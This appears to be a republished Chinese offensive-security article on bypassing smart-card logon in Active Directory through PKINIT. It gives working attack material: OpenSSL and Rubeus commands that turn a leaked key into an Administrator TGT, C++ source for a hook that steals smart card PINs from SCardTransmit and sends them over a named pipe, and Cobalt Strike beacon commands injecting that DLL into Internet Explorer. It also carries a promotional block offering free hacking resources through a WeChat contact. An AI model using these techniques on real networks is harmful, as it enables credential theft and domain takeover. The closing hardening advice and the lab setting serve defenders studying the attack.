最近，我参与了一项攻击基于智能卡的活动目录的工作。实际上，你根本不需要使用物理智能卡来验证登录这个活动目录。证书的属性决定了它是否可以用于基于智能卡进行登录。因此，如果你能获得相应的私钥，那么就可以绕过智能卡的验证实现登录。

当用户被设置为基于智能卡进行登录时，在它的默认配置中，域控制器将接受任何由它所信任的证书授权机构签署的、符合以下规范的证书：

● CRL的分配点不可为空、并且可用

● 证书的密钥要使用数字签名

● 增强型的密钥使用：

\- 智能卡登录

\- 客户端认证（可选，用于基于SSL的认证）

● 包含用户UPN的主题替代名称

此外，如果启用了允许使用无扩展密钥的证书属性组策略，那么就没必要使用增强型的密钥。因为这可能会导致发给域用户或计算机的其他类型的证书。

![img](https://image.3001.net/images/20230515/1684133961_6461d849f1a1a034a0a1b.png!small)

下面是我们的具体的研究过程。

### PKINIT

正如我们所知的，域内的活动目录会使用Kerberos协议来验证域名。攻击者可以使用像Rubeus、Mimikatz、Kekeo和impacket这样的工具来针对域环境进行利用。

那么，基于 PKI 的认证与 Kerberos 的认证有什么关系呢？早在 2006 年，微软和航空航天公司联合提交了 RFC 4556。这协议引入了对
Kerberos 预认证的公钥密码学的支持。

预认证方法可以防止Kerberos对账户密码进行离线暴力攻击。如果没有在AD账户上启用预认证，那么用户就容易受到AS-REP的攻击。随着预认证的引入，那么最初的AS-REQ Kerberos请求就会包含一个加密的时间戳。并且这个用来加密的密钥来自于用户的密码。这向 KDC
证明了请求登录的用户确实知道账户密码。因此，KDC就会返回一个与用户密码相关的加密的AS-REP（对AS-REQ的响应）。预认证数据包含的一个时间戳也可以防止重放攻击。如果预认证数据无效，KDC会返回一个错误，而且也不允许对AS-REP响应密钥进行暴力破解。如果一个攻击者能够在一个网络中抓取 Kerberos的响应数据包，那么针对AS-REP 的修改仍然是可能的。

基于 PKI 的认证同样也是以类似的方式进行工作。它首先会使用 Kerberos
预认证来证明用户是他们所说的那个人。同样，它也会使用一个时间戳，但不是使用用户的密码生成的密钥对信息进行加密，而是用属于证书的私钥以PKCS
#7加密信息语法（CMS）的形式来签署信息。该私钥可以存储于物理智能卡上，并且也可以以其他的形式进行存储，这其中也包括不那么安全的方法。一旦KDC验证了CMS有效载荷的签名，并且一切正常，那么AS-REP就会返回给客户。PKINIT也会对AS-REP响应进行加密。因为在基于PKI的Kerberos登录过程中并没有使用密码，所以用户密钥对客户来说是未知的。为了解决这个问题，AS-REP要么使用一个使用Diffie-Hellman密钥交换算法获得的密钥进行加密，要么使用初始AS-REQ请求中使用的证书公钥进行加密。并且这个初始请求也包含了关于哪种方法是首选的具体细节。

从这里开始，其他的一切还都保持不变。客户端将会获得一个有效的TGT，可用于申请TGS票据。并且该证书在TGT的有效期内就不再使用，在再次需要该证书的私钥之前，一般会保持7天的有效期。当然，这并不是说在Windows登录期间，私钥在7天内不会被使用。如果机器被锁定或用户已经被注销，那么Windows会像基于密码的登录那样强制进行认证。但从攻击者的角度来看，如果他们已经获得了TGT，这其实就已经不重要了。

所以这里我开始尝试在Rubeus中添加对PKINIT的支持，并创建了一个请求。

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

### 基于PKCS#12的认证(PFX)

这里我们讨论的第一个攻击场景是用户私钥泄露问题。我们可以使用一个PKCS#12证书库，我们可以使用一个用户的证书以及相应的私钥来生成一个Kerberos
TGT。一旦你有了私钥blob和相应的证书，那么你就可以使用OpenSSL来生成PKCS12存储，如下所示：

    
    
    openssl pkcs12 -export -out leaked.pfx -inkey privateKey.key -in certificate.crt 

一旦你生成了一个有效的证书存储，那么我们就可以使用Rubeus中新增加的内容来请求TGT了。如果你决定用密码来保护证书库，那么你可以在命令行中加入/password选项。

    
    
    Rubeus.exe asktgt /user:Administrator /certificate:leaked.pfx /domain:hacklab.local /dc:dc.hacklab.local

然后，Rubeus将生成一个基于PKINIT的AS-REQ，使用我们所提供的证书库来验证用户。如果一切顺利，KDC就会返回数据包，那么你就应该会得到类似的输出：

    
    
    ______        _  
    (_____ \      | |  
    _____) )_   _| |__  _____ _   _  ___  
    |  __  /| | | |  _ \| ___ | | | |/___)  
    | |  \ \| |_| | |_) ) ____| |_| |___ |  
    |_|   |_|____/|____/|_____)____/(___/  
    v1.5.0  
    [*] Action: Ask TGT  
    [*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=hacklab, DC=local  
    [*] Building AS-REQ (w/ PKINIT preauth) for: 'hacklab.local\Administrator'  
    [+] TGT request successful!  
    [*] base64(ticket.kirbi):  
    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  
    ServiceName           :  krbtgt/hacklab.local  
    ServiceRealm          :  HACKLAB.LOCAL  
    UserName              :  Administrator  
    UserRealm             :  HACKLAB.LOCAL  
    StartTime             :  02/04/2023 16:01:12  
    EndTime               :  03/04/2023 02:01:12  
    RenewTill             :  09/04/2023 16:01:12  
    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable  
    KeyType               :  rc4_hmac  
    Base64(key)           :  6tIiFytU5V2cgSpXt8skdw==

那么由此产生的 .kirbi Base64 编码字符串也可用于从 KDC中获得正常的 TGS。

在我成功地在这个工具中使用了PKINIT之后，我开始思考我们该如何使用物理智能卡做认证。一旦用户的机器受到攻击破坏，那么使用智能卡进行认证最大的问题就是密码。如果不知道PIN码，那么我们就无法生成一个有效的AS-REQ。蛮力破解是不可行的，因为进行3次无效的尝试，那么系统就会先进行账号锁定。

其中的一个思路就是，当用户需要解锁智能卡时可以尝试捕获PIN码。这主要用于机器解锁或者登录网络上其他需要智能卡认证的服务。

经过一番调查，我发现了WinSCard DLL。这个DLL是与Smard
Card服务通信的网关。然后这个服务就会控制智能卡的通信。一般来说，任何与Windows上的智能卡进行通信的东西都需要使用WinSCard API。

我所研究的WinSCard.dll中最重要的函数是SCardTransmit API。这个API是用于传输智能卡ISO/IEC
7816规范中所要求的应用协议数据单元（APDU）的API。这个是最底层的传输单元，主要是用于智能卡通信。

  
![01.png](https://image.3001.net/images/20230515/1684133963_6461d84b1da5026fe54b1.png!small)

如果我们hook这个API，那么我们应该就能够监视传送到卡上的PDU。

    
    
    LONG SCardTransmit(  
    SCARDHANDLE         hCard,  
    LPCSCARD_IO_REQUEST pioSendPci,  
    LPCBYTE             pbSendBuffer,  
    DWORD               cbSendLength,  
    LPSCARD_IO_REQUEST  pioRecvPci,  
    LPBYTE              pbRecvBuffer,  
    LPDWORD             pcbRecvLength  
    );

pbSendBuffer参数是向卡片发送的APDU数据包，而pbRecvBuffer则是智能卡返回的响应数据。

虽然ISO智能卡规范对某些命令类别和命令数据结构做出了限制，但这些限制通常是针对某些具体应用的，而不是由ISO智能卡规范本身定义的。并且为了满足身份访问的需求，NIST制定了个人身份验证（PIV）SP
800-73-4规范。该规范涵盖了智能卡应如何处理注册到设备上的证书，以及实现该规范的所有APU，这个不需要太多的细节。在PIV规范中最重要的是第3.2.1节VERIFY卡命令。这些内容阐述了VERIFY
APDU是如何在允许访问存储在卡片上的私钥之前进行PIN的验证。

因此，有了ISO规范中的信息以及PIV规范中的3.2.1节，我们应该能够写一个hook程序来捕获传送到卡上的PIN。

    
    
    DWORD WINAPI SCardTransmit_Hooked(SCARDHANDLE hCard,  
    LPCSCARD_IO_REQUEST pioSendPci,  
    LPCBYTE             pbSendBuffer,  
    DWORD               cbSendLength,  
    LPSCARD_IO_REQUEST  pioRecvPci,  
    LPBYTE              pbRecvBuffer,  
    LPDWORD             pcbRecvLength) {  
      
    char debugString[1024] = { 0 };  
    DWORD result = pOriginalpSCardTransmit(hCard, pioRecvPci, pbSendBuffer, cbSendLength, pioRecvPci, pbRecvBuffer, pcbRecvLength);  
    //Check for CLA 0, INS 0x20 (VERIFY) and P1 of 00/FF according to NIST.SP.800-73-4 (PIV) specification  
    if (cbSendLength >= 13 && pbSendBuffer[0] == 0 && pbSendBuffer[1] == 0x20 && (pbSendBuffer[2] == 0 || pbSendBuffer[2] == 0xff)) {  
    //Check card response status for success  
    bool success = false;  
    if (pbRecvBuffer[0] == 0x90 && pbRecvBuffer[1] == 0x00) {  
    success = true;  
    }  
    char asciiPin[9];  
    sprintf_s(debugString, sizeof(debugString), "Swipped VERIFY PIN: Type %s, Valid: %s, Pin: %s", GetPinType(pbSendBuffer[3]), success ? "true" : "false",   
    GetPinAsASCII(pbSendBuffer+5, min(pbSendBuffer[4],8), asciiPin));  
    SendPINOverPipe(debugString);             
    }  
    return result;  
    }

API调用做的第一件事就是调用原始的SCardTransmit函数。我们不仅需要研究数据请求，而且还要知道卡的响应数据。这样我们就可以确定传送给卡片的PIN码是否正确。然后，该函数会查找VERIFY
PDU来隔离验证PIN的命令。一旦我们确定了VERIFY PDU，那么我们就可以开始检查结果，0x90
0x00都表示PIN被审核。接下来，我们可以从发送缓冲区的偏移量5（PDU结构中的命令数据）的位置处提取PIN码。最后，我们需要通过一个命名管道来传输PIN码的详细信息，然后使用数据接收程序进行捕获。

我们可以将这一功能打包到一个DLL中，该DLL也能够进行反射性加载，那么我们可以将该DLL注入到我们所研究的进程中去。

### Demo

假设在存在该漏洞的情况下，并且我已经有了一个Cobalt
Strike信标连接到了受害者的工作站上。我所使用的是管理员账户，但其实普通用户的账户也可以进行使用。PinSwipe
DLL也可以被注入到一个高权限的进程中，如lsass，当获得管理权限时，可以在登录时刷出PIN码，但使用普通用户身份进行访问时，你将会被限制在用户模式进程中，如Internet
Explorer等等。

所以首先我们需要启动PinSwipeListener，这将可以dump出智能卡登录EKU的用户证书信息。

    
    
    beacon> execute-assembly C:\tools\PinSwipeListener.exe  
    [*] Tasked beacon to run .NET program: PinSwipeListener.exe  
    [+] host called home, sent: 112171 bytes  
    [+] received output:  
    [+] Found smart card logon certificate with thumbprint 55C65AB0B9B6A893A6E8449FB34DD61093B231D8 and subject CN=Administrator, CN=Users, DC=hacklab, DC=loca

有了监听器，我们就需要选择将PinSwipe.dll注入到哪些进程中。像Internet
Explorer、Chrome等都是很好的选择，因为在智能卡认证的环境中，这些程序会经常弹出请求PIN的信息。在这里，我运行的是Internet
Explorer，它的PID是
2678。实际上，IE和Chrome一样，为浏览器的各种标签都启动了不同的子进程。所以你需要注入一个正确的进程。同时也可以使用其他更高级的攻击脚本，不断寻找新的IE进程并注入它们。

    
    
    beacon> dllinject 2678 C:\tools\PinSwipe.dll  
    [*] Tasked beacon to inject C:\tools\PinSwipe.dll into 2678

一旦用户在对话框中输入了他们的PIN码，PinSwipe就会捕获请求并通过命名管道将其发送给PinSwipeListener。

![img](https://image.3001.net/images/20230515/1684133964_6461d84c31531a2b1fdff.png!small)

    
    
    [+] received output:  
    [+] PinSwipe: Swipped VERIFY PIN: Type PIV Card Application, Valid: true, Pin: 123456

PinSwipe的输出除了显示输入的PIN号码外，还将显示输入的PIN是否正确。一旦你获取了PIN码，你就可以使用新的Rubeus功能来请求使用用户的物理智能卡进行TGT验证。这一次，我们可以使用/certificate参数来指定所要使用的证书的文件名。

    
    
    beacon> execute-assembly C:\tools\Rubeus.exe asktgt /user:Administrator /domain:hacklab.local /dc:192.168.74.2 /certificate:55C65AB0B9B6A893A6E8449FB34DD61093B231D8 /password:123456  
    [*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:Administrator /domain:hacklab.local /dc:192.168.74.2 /certificate:55C65AB0B9B6A893A6E8449FB34DD61093B231D8 /password:123456  
    [+] host called home, sent: 357691 bytes  
    [+] received output:  
    ______        _                        
    (_____ \      | |                       
    _____) )_   _| |__  _____ _   _  ___   
    |  __  /| | | |  _ \| ___ | | | |/___)  
    | |  \ \| |_| | |_) ) ____| |_| |___ |  
    |_|   |_|____/|____/|_____)____/(___/  
    v1.5.0   
    [*] Action: Ask TGT  
    [+] received output:  
    [*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=hacklab, DC=local   
    [*] Building AS-REQ (w/ PKINIT preauth) for: 'hacklab.local\Administrator'  
    [+] received output:  
    [+] TGT request successful!  
    [+] received output:  
    [*] base64(ticket.kirbi):  
    doIGAjCCBf6gAwIBBaEDAgEWooIFDzCCBQthggUHMIIFA6ADAgEFoQ8bDUhBQ0tMQUIuTE9DQUyiIjAg  
    oAMCAQKhGTAXGwZrcmJ0Z3QbDWhhY2tsYWIubG9jYWyjggTFMIIEwaADAgESoQMCAQKiggSzBIIEr6H1  
    bNWgmfBxlK7OILXLN4UcW50vCbU2ry2NA+d+VrLScEqcZBUcmv93C5DrxSRRPKXpKfyrvDc9NR5o0hR5  
    L21tDiNgcRJqTrg1ZnkLa79Ru5y8R8CylgLv8/aqjEmejdCIJ+uynJMYCrZPuxkeV+n3noGEKPHMK0ek  
    iDXz9CyteawxHlxLZQOV+NEcJ8KCV9DJQ2p/eLxFXeCDmogWVle7+tOSHie6LvqfxfeWtgMIrGBXUHBZ  
    ysdwqJSrFz8sJW9KCUVOLgHYvQZTkUtTsmclprvsRYYVSVY6eyRLeXPX8Ib9ewmQUrGLPazWdIWgtbei  
    BQV2IY+2h8o3BmsyMHOkXSkK42GwPobJo/OzJrbUDlB3+9PTyWUYukvqO2O73Hd5q9tkewx4rj+/vzNA  
    PwnMx+zTFFQqki5cF5R/oixISioVZi9dab+wSXSY5EH0bVyWS5G7aMBXrD0qnpiM4jiCgAAvtDEGqzSq  
    nS6H7BEn2c/RJVGHJDOK45lmrvmnqH1zjUzaIEAJg7OifV6KGlRbriSO3CFzOk2o4HJ9Ce2BW2OwFyoH  
    KzDGHrW+3jtHLgcd8Bvrt5TJpN6LOmEN3nn5LSeS0lXTJ2j9FEXuc0BOoOT+lyrBXMKVK30Ygisi17y4  
    j3m2QN+eFwk/TigUMXVYE0UMwMKmxu055jomdNrgSzLc0NrXT9sMIGrTOmdzOZa0LIOpVf0bb07wNy/N  
    to1dXNdxlU4abTBllKMypn90HFL+ygi6kTrgMyHZ8RF1u5CZv+FDnq8ksRykXfvM2av9gs4oiINeVzMr  
    dELTTnt4h0+mtw7QqceY53UANu3wSmyh65qAT4rrRs/dLU0D8T+0159VZxc4pvWvomZw+/v3KaMFQ3+O  
    cIDxFInYSn/fABW3mUZZzGFLuCUMCU9inmo6i7JVxYHOE4OcaqhJFgB3+yiJghGXq4Xsv7BWhJI7yMN7  
    wLf/0/epfMmbk7x6baDVsBHFe0MZXoEdRHhjcXydEVj4JqkGSawA1/lVO2TKJRj2Z5aBLOORI70/Jy76  
    y2ysovsvaFjefdq4ep0cRHsGMpvqlz//9i0rq5zEX3OD3kNfMcx9EwtEnfd99HMztLbhhJ8327K5fKCo  
    sI3iLMcjX+26O/hvvu3ssjOC3i4zmWcTtzhbPLJgLDOAKaL/qb5GMef85UFpvKx/irHysFGjiBr5IHAC  
    9+BFnIrE4uvd7IVfVMzq4O5VWXf4c6R2cxtfYfdtFmUUgmCrQoBji7P7fH3TP/T/0MZa/vDTv+xMgJTh  
    WSjXc9wnF5nuZ+5VufF6KQP6aizDYagASD7kpBCVyYU/65/0Kg6WuIl+gQWeJYiqJxQYSAV8UZoi7QX2  
    962Ci0xsE4XfvvsI3Grem9BTgxGoxauZWEO0jSQhyLbTHcJYoWCCG/cgKamZN2YG1J6bOpsrx8txogJS  
    W0zGy7tNw7pnUZyKCjx1j0TVU2BemZ/Gnwa1oX3aa7jdPGKJRMi5pg3k2Oy1RtX+ff7fuCTsBVVGMafc  
    LKFq4uhYtIKQYLArt4aRRAlzOWUiHBfAk1Moihn/AfACl5QwQVwoLRQtGXFjifHbSqHVJBIbxpdao4He  
    MIHboAMCAQCigdMEgdB9gc0wgcqggccwgcQwgcGgGzAZoAMCARehEgQQ5K2V8xIaGbUS8ZYqTl120aEP  
    Gw1IQUNLTEFCLkxPQ0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOEAAKURGA8yMDIw  
    MTAwNDE4NTUyOVqmERgPMjAyMDEwMDUwNDU1MjlapxEYDzIwMjAxMDExMTg1NTI5WqgPGw1IQUNLTEFC  
    LkxPQ0FMqSIwIKADAgECoRkwFxsGa3JidGd0Gw1oYWNrbGFiLmxvY2Fs  
    ServiceName           :  krbtgt/hacklab.local  
    ServiceRealm          :  HACKLAB.LOCAL  
    UserName              :  Administrator  
    UserRealm             :  HACKLAB.LOCAL  
    StartTime             :  04/04/2023 19:55:29  
    EndTime               :  05/04/2023 05:55:29  
    RenewTill             :  11/04/2023 19:55:29  
    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable  
    KeyType               :  rc4_hmac  
    Base64(key)           :  5K2V8xIaGbUS8ZYqTl120Q==

那么到此结束。你现在已经有了一个TGT，并且可以在7天内申请新的TGS票，然后访问其他的网络资源。

当你在网络中使用物理智能卡时，最好的办法是拥有需要手动按键的卡，或者最好是生物识别阅读器。这样一来，对用户账户进行的任何攻击都不会产生TGT数据，因为智能卡会在没有物理按键或生物识别数据存在的情况下阻止对私钥的访问。

  

